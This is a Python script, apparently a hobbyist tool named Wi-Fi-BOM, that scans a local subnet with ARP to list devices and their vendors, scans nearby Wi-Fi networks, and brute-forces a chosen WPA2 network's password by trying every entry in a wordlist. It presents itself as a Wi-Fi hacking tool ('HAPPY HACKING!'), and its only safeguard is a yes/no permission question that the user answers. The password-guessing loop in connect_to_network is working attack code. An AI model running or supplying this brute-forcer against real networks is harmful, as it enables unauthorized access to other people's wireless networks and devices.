from scapy.all import ARP, Ether, srp
import manuf
import pywifi
from tabulate import tabulate
import time
import os
from pywifi import const
import socket

def get_connected_ips(subnet):
    arp = ARP(pdst=subnet+"/24")
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp

    result = srp(packet, timeout=3, verbose=0)[0]

    connected_devices = []
    for sent, received in result:
        connected_devices.append((received.psrc, received.hwsrc))

    return connected_devices


def get_device_info(mac_address):
    p = manuf.MacParser()
    manufacturer = p.get_manuf(mac_address)
    return manufacturer


def animate_typing(message: str, delay: float):
    for char in message:
        print(char, end="", flush=True)
        time.sleep(delay)
    print()


def print_connected_devices(subnet, prev_connected_devices):
    connected_devices = get_connected_ips(subnet)

    # Clear the terminal
    os.system("cls" if os.name == "nt" else "clear")

    # Print banner and table headers
    banner = """
 _______ _________ _______ _________ _______  _______  _______ 
(  ____ \\__   __/(  ____ )\__   __/(  __   )(  __   )(  ____ )
| (    \/   ) (   | (    )|   ) (   | (  )  || (  )  || (    )|
| |         | |   | (____)|   | |   | | /   || | /   || (____)|
| | ____    | |   |  _____)   | |   | (/ /) || (/ /) | _____ |
| | \_  )   | |   | (         | |   |   / | ||   / | |(_____)( )
| (___) |___) (___| )      ___) (___|  (__) ||  (__) |       | |
(_______)\_______/|/       \_______/(_______)(_______)       \_/
"""
    print(banner)

    # Create a table of connected devices
    table_data = []
    for ip, mac in connected_devices:
        manufacturer = get_device_info(mac)
        table_data.append([ip, mac, manufacturer])

    table_headers = ["Dirección IP", "Dirección MAC", "Fabricante"]
    table_formatted = tabulate(table_data, headers=table_headers, tablefmt="grid")

    # Print the table
    print(table_formatted)

    # Check if option 0 (Return to menu) was selected
    if input("\nPresiona 0 para regresar al menú principal o cualquier otra tecla para continuar: ") == "0":
        return []

    return connected_devices

def get_available_networks():
    wifi = pywifi.PyWiFi()  # Inicializar la interfaz WiFi
    iface = wifi.interfaces()[0]  # Obtener la primera interfaz WiFi disponible

    iface.scan()  # Escanear redes inalámbricas
    time.sleep(8)  # Aumentar el tiempo de espera para permitir un escaneo más prolongado

    networks = iface.scan_results()

    network_data = []
    for network in networks:
        ssid = network.ssid  # Nombre de la red (SSID)
        bssid = network.bssid  # Dirección MAC del punto de acceso
        signal_strength = network.signal  # Fuerza de la señal en dBm
        encryption_type = network.akm[0]  # Tipo de cifrado

        network_data.append([ssid, bssid, signal_strength, encryption_type])

    return network_data

def connect_to_network(network, wordlist_file):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]

    # Scan for available networks
    iface.scan()
    time.sleep(0.8)

    target_network = None
    for scan_result in iface.scan_results():
        if scan_result.ssid == network.ssid:
            target_network = scan_result
            break

    if target_network is None:
        print("Target network not found.")
        return False

    with open(wordlist_file, "r") as f:
        passwords = f.readlines()

    for password in passwords:
        password = password.strip()

        profile = pywifi.Profile()
        profile.ssid = target_network.ssid
        profile.auth = pywifi.const.AUTH_ALG_OPEN
        profile.akm.append(pywifi.const.AKM_TYPE_WPA2PSK)
        profile.cipher = pywifi.const.CIPHER_TYPE_CCMP
        profile.key = password

        iface.remove_all_network_profiles()
        iface.add_network_profile(profile)

        iface.connect(profile)
        time.sleep(1)  # Wait for the connection attempt to complete

        if iface.status() == pywifi.const.IFACE_CONNECTED:
            print("Correct password found: " + password)
            return True

        print("Incorrect password: " + password)

    print("Password not found.")
    return False


def animate_connection_attempt(password):
    animation = "1010101"
    for char in animation:
        print(char, end="", flush=True)
        time.sleep(0.2)
    print(f"  Trying password: {password}", flush=True, end="\r")


def print_available_networks():
    # Obtain the list of available Wi-Fi networks
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]

    iface.scan()

    time.sleep(5)  # Wait for the scan to complete

    networks = iface.scan_results()

    network_data = []
    for i, network in enumerate(networks, start=1):
        ssid = network.ssid
        bssid = network.bssid
        signal_strength = network.signal

        network_data.append([i, ssid, bssid, signal_strength])

    # Print the table of available networks
    table_headers = ["No.", "SSID", "BSSID", "Signal Strength"]
    table_formatted = tabulate(network_data, headers=table_headers, tablefmt="grid")
    print(table_formatted)

    # Prompt the user to connect to a network
    selected_network = input("Enter the number of the network you want to connect to (0 to cancel): ")
    if selected_network == "0":
        return

    # Prompt the user for the wordlist file
    wordlist_file = input("Enter the path to the wordlist file: ")

    # Connect to the selected network
    selected_network = int(selected_network) - 1
    if selected_network < 0 or selected_network >= len(networks):
        print("Invalid network selection.")
        return

    network = networks[selected_network]
    connected = connect_to_network(network, wordlist_file)

    if connected:
        print("Password found!")
    else:
        print("Password not found!")

    # Prompt the user to try again or return to the main menu
    choice = input("Press 1 to try again or 0 to return to the main menu: ")
    while choice not in ["0", "1"]:
        choice = input("Invalid choice. Press 1 to try again or 0 to return to the main menu: ")

    if choice == "0":
        return

    # Clear the screen
    os.system("cls")

def animate_typing(text, delay):
    for char in text:
        print(char, end="", flush=True)
        time.sleep(delay)
    print()

def animate_typing(text, delay):
    for char in text:
        print(char, end="", flush=True)
        time.sleep(delay)
    print()

def main():
    banner = """
 _______ _________ _______ _________ _______  _______  _______ 
(  ____ \\__   __/(  ____ )\__   __/(  __   )(  __   )(  ____ )
| (    \/   ) (   | (    )|   ) (   | (  )  || (  )  || (    )|
| |         | |   | (____)|   | |   | | /   || | /   || (____)|
| | ____    | |   |  _____)   | |   | (/ /) || (/ /) | _____ |
| | \_  )   | |   | (         | |   |   / | ||   / | |(_____)( )
| (___) |___) (___| )      ___) (___|  (__) ||  (__) |       | |
(_______)\_______/|/       \_______/(_______)(_______)       \_/
"""

    # Agregar el párrafo estilo "lorem" con menos distancia entre letras
    lorem_paragraph = "Hola te saluda Wi-Fi-BOM una herramienta de Wi-Fi hack compilada por Cisco101. " \
                      "Selecciona una de las siguientes opciones  HAPPY HACKING!"
    animate_typing(lorem_paragraph, delay=0.03)

    print(banner)

    author_info = "Author: Cisco101\nInstagram: cisco10101\nGitHub: https://github.com/Cisco101010"
    animate_typing(author_info, delay=0.03)

    # Pregunta 1: ¿Deseas iniciar el escaneo?
    prompt_message = "¿Deseas iniciar el escaneo? (s/n): "
    user_input = input(prompt_message)

    if user_input.lower() != "s" and user_input.lower() != "n":
        animate_typing("Selecciona una opción válida.", delay=0.3)
        user_input = input(prompt_message)  # Solicitar nuevamente la opción

    if user_input.lower() == "n":
        animate_typing("Escaneo cancelado. Hasta luego.", delay=0.5)
        return

    # Pregunta 2: ¿Tienes permitido escanear esta red?
    permission_prompt = "¿Tienes permitido escanear esta red? (s/n): "
    permission_input = input(permission_prompt)

    if permission_input.lower() != "s" and permission_input.lower() != "n":
        animate_typing("Selecciona una opción válida.", delay=0.3)
        permission_input = input(permission_prompt)  # Solicitar nuevamente la opción

    if permission_input.lower() == "n":
        animate_typing("No tienes permiso para escanear esta red. Terminando el programa.", delay=0.3)
        return

    while True:
        # Pregunta 3: ¿Qué opción deseas ejecutar?
        option_prompt = "¿Qué opción deseas ejecutar?\n1. Escaneo de red\n2. Detección de redes Wi-Fi\nSelecciona un método: "
        option_input = input(option_prompt)

        if option_input != "0" and option_input != "1" and option_input != "2":
            animate_typing("Selecciona una opción válida.", delay=0.3)
            continue  # Volver al inicio del bucle principal

        if option_input == "0":
            continue  # Volver al inicio del bucle principal

        elif option_input == "1":
            subnet = "192.168.1.1"  # Cambia esta línea con la dirección IP de tu router
            prev_connected_devices = []

            animate_typing("Escaneo de red iniciado.", delay=0.5)

            while True:
                try:
                    prev_connected_devices = print_connected_devices(subnet, prev_connected_devices)
                    if not prev_connected_devices:
                        break  # Option 0 selected (Return to menu)
                    time.sleep(5)  # Pausa de 5 segundos antes de la siguiente actualización
                    animate_typing("Actualizando...", delay=0.3)
                except KeyboardInterrupt:
                    animate_typing("Escaneo interrumpido por el usuario.", delay=0.5)
                    break

        elif option_input == "2":
            animate_typing("Detección de redes Wi-Fi iniciada.", delay=0.3)
            print_available_networks()

            # Solicitar opción para intentar otra vez o volver al menú principal
            choice = input("Presiona 1 para intentar nuevamente o 0 para volver al menú principal: ".ljust(61))
            while choice != "0" and choice != "1":
                animate_typing("Selecciona una opción válida.", delay=0.3)
                choice = input("Presiona 1 para intentar nuevamente o 0 para volver al menú principal: ".ljust(61))

            if choice == "0":
                break  # Regresar al menú principal

        # Limpiar la pantalla
        os.system("cls")


if __name__ == "__main__":
    main()